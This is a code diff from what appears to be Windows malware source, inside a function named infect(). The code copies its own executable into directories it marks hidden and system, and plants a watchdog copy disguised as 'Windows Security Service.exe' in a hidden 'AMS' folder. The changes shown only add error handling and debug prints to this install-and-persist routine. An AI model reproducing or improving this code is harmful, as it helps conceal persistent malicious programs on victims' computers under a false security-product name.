@@ -54,19 +54,25 @@ void infect(){
     GetDestination(destination);
 
 
+    int status;
     // Copy the executable into the destination
     char executableDestination[MAX_PATH];
     strcpy(executableDestination, destination);
     strcat(executableDestination, serviceName);    // Add the directory
     strcat(executableDestination, "\\");
-    CreateDirectoryA(executableDestination, NULL); // Create the directory
+    status = CreateDirectoryA(executableDestination, NULL); // Create the directory
+    if(status == 0 && GetLastError() != ERROR_ALREADY_EXISTS){
+        printf("Error creating directory: %d\n", GetLastError());
+        return;
+    }
     SetFileAttributesA(executableDestination, 
                         FILE_ATTRIBUTE_HIDDEN | 
                         FILE_ATTRIBUTE_SYSTEM);    // Set the attributes to hidden & system
     strcat(executableDestination, serviceName);    // Add the service name
     strcat(executableDestination, ".exe");         // Add the extension
 
-    int status = CopyFileA(path, executableDestination, FALSE);
+    printf("Copying file to: %s\n", executableDestination);
+    status = CopyFileA(path, executableDestination, FALSE);
     if(status == 0){
         printf("Error copying file: %d\n", GetLastError());
         return;
@@ -80,12 +86,17 @@ void infect(){
     char watchdogDestination[MAX_PATH];
     strcpy(watchdogDestination, destination);
     strcat(watchdogDestination, "AMS\\");                        // Add the directory
-    CreateDirectoryA(watchdogDestination, NULL);                 // Create the directory
+    status = CreateDirectoryA(watchdogDestination, NULL);                 // Create the directory
+    if(status == 0 && GetLastError() != ERROR_ALREADY_EXISTS){
+        printf("Error creating directory: %d\n", GetLastError());
+        return;
+    }
     SetFileAttributesA(watchdogDestination, 
                         FILE_ATTRIBUTE_HIDDEN | 
                         FILE_ATTRIBUTE_SYSTEM);                  // Set the attributes to hidden & system
     strcat(watchdogDestination, "Windows Security Service.exe"); // Add the service name
 
+    printf("Copying file to: %s\n", watchdogDestination);
     status = CopyFileA(path, watchdogDestination, FALSE);
     if(status == 0){
         printf("Error copying file: %d\n", GetLastError());
